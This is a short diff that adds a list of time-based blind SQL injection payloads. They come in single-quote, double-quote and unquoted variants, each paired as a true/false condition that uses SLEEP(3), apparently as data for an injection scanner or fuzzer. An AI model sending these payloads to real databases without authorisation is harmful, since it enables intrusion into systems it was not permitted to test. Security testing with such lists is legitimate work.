@@ -1,0 +1,12 @@
+single_quote:' AND IF(1=1, 0, SLEEP(3))#
+single_quote:' AND IF(1=2, 0, SLEEP(3))#
+
+double_quote:" AND IF(1=1, 0, SLEEP(3))#
+double_quote:" AND IF(1=2, 0, SLEEP(3))#
+
+no_quote: AND IF(1=1, 0, SLEEP(3))
+no_quote: AND IF(1=2, 0, SLEEP(3))
+
+
+
+
